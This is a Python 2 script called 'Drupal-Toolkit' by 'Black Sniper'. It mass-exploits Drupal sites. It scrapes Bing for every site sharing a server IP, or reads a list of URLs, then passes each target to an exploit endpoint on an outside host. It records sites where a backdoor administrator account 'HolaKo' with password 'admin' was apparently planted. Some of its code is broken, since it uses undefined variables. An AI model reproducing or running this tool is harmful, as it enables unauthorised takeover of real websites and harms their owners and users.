#!/usr/bin/python

import urllib2,urllib,re,sys,json
from urlparse import urlparse

logo = '''
  ____                         _     _____           _ _    _ _   
 |  _ \ _ __ _   _ _ __   __ _| |   |_   ____   ___ | | | _(_| |_ 
 | | | | '__| | | | '_ \ / _` | |_____| |/ _ \ / _ \| | |/ | | __|
 | |_| | |  | |_| | |_) | (_| | |_____| | (_) | (_) | |   <| | |_ 
 |____/|_|   \__,_| .__/ \__,_|_|     |_|\___/ \___/|_|_|\_|_|\__|
                  |_|                                      Version 1.0     
'''

menu ='''
\t{1} Drupal Bing Exploiter
\t{2} Get Drupal Websites
\t{3} Drupal Mass Exploiter
\t{4} About Me
'''
def about():

     print '''
        	 
    
	#    This Tool Created By Black Sniper                              #
	|                                                                   |
	#         Dont change The Right                                     #
	|                                                                   |
	#     Hacker Make Tool Not Tool Make Hacker                         #
	|                                                                   |
	# Contact Me If You Have An Idea Or For Make Tool For same Exploit  #
	|                                                                   |
	#       Mail : Black4Sniper@hotmail.com                             #
	|                                                                   |
	
	

'''

            #Definition Of Drupal Bing Expoliter 
def drupal():

    '''Drupal Exploit Binger All Websites Of server '''
    ip  = raw_input('1- IP : ')
    page  = 1
    while page <= 50 :
      
      url   = "http://www.bing.com/search?q=ip%3A"+ip+"&go=Valider&qs=n&form=QBRE&pq=ip%3A"+ip+"&sc=0-0&sp=-1&sk=&cvid=af529d7028ad43a69edc90dbecdeac4f&first="+str(page)
      req   = urllib2.Request(url)
      opreq = urllib2.urlopen(req).read()
      findurl = re.findall('<div class="b_title"><h2><a href="(.*?)" h=',opreq)
      page += 1 
      
      for url in findurl :
        try : 
            
                        urlpa = urlparse(url)
                        site  = urlpa.netloc

                        print "[+] Testing At "+site
                        resp = urllib2.urlopen('http://crig-alda.ro/wp-admin/css/index2.php?url='+site+'&submit=submit')
                        read=resp.read()
                        if "User : HolaKo" in read:
                           print "Exploit found =>"+site

                           print "user:HolaKo\npass:admin"
                           a = open('up.txt','a')
                           a.write(site+'\n')
                           a.write("user:"+user+"\npass:"+pwd+"\n")
                        else :
                           print "[-] Expl Not Found :( "

        except Exception as ex :
                       print ex
                       sys.exit(0)


            #Drupal Server ExtraCtor
def getdrupal():
    ip  = raw_input('2- Ip : ')
    page  = 1
    sites = list()
    while page <= 50 :
      
      url   = "http://www.bing.com/search?q=ip%3A"+ip+"+node&go=Valider&qs=ds&form=QBRE&first="+str(page)
      req   = urllib2.Request(url)
      opreq = urllib2.urlopen(req).read()
      findurl = re.findall('<div class="b_title"><h2><a href="(.*?)" h=',opreq)
      page += 1 
      
      for url in findurl :
                             split = urlparse(url)
                             site   = split.netloc
                             if site not in sites :
                                      print site 
                                      sites.append(site)
      

            #Drupal Mass List Exploiter 
def drupallist():
        listop = raw_input("Enter The list Txt :")
	fileopen = open(listop,'r')
	content = fileopen.readlines() 
	for i in content :
                url=i.strip()
		try :
			openurl = urllib2.urlopen('http://crig-alda.ro/wp-admin/css/index2.php?url='+url+'&submit=submit')
			readcontent = openurl.read()
			if  "Success" in readcontent :
                                print "[+]Success =>"+url
				print "[-]username:HolaKo\n[-]password:admin"
                                save = open('drupal.txt','a')
                                save.write(url+"\n"+"[-]username:HolaKo\n[-]password:admin\n")
                               
			else : 
				print i + "=> exploit not found " 
		except Exception as ex :
                   		print ex

def main():
 print logo
 print menu
 choose = raw_input("choose a number :")
 while True : 
  
  if choose == "1": 
    drupal()
  if choose == "2":
    getdrupal()
  if choose == "3":
    drupallist()
  if choose == "4":
    about()
  if choose == "11":
        print "#By"
        exit()
  con = raw_input('Continue [Y/n] -> ')
  if con[0].upper() == 'N' :
                                exit()
  if con[0].upper() == 'Y' :
                                main()
                                


if __name__ == '__main__':main()